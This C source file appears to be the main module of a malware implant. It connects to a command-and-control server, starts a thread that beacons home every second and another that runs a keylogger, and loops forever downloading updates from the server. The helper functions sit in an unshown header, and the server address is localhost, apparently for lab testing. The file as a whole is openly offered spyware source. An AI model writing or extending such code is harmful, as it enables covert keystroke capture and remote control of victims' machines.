#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

/* For sockets */
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "core.h"

#define IP_ADDR "127.0.0.1"
#define PORT 8080

void *inf_ping(void *socket_desc)
{
	while (1) {
		ping_home(socket_desc);
		sleep(1);
	}

	return NULL;
}

void *keylogger()
{
	init_keylogger();

	return NULL;
}

int main()
{
	int socket_desc = 0;
	struct sockaddr_in server;

	memset(&server, 0, sizeof(server));
	
	pthread_t thread_id_ping, thread_id_keylogger;

	if (connect_cc(IP_ADDR, PORT + 1, &socket_desc, &server, 0) == ERROR)
		return ERROR;

	pthread_create(&thread_id_ping, NULL, inf_ping, &socket_desc);
	pthread_create(&thread_id_keylogger, NULL, keylogger, NULL);

	while (1)
	{
		download_update(IP_ADDR, PORT);
		sleep(5);
	}


	return 0;
}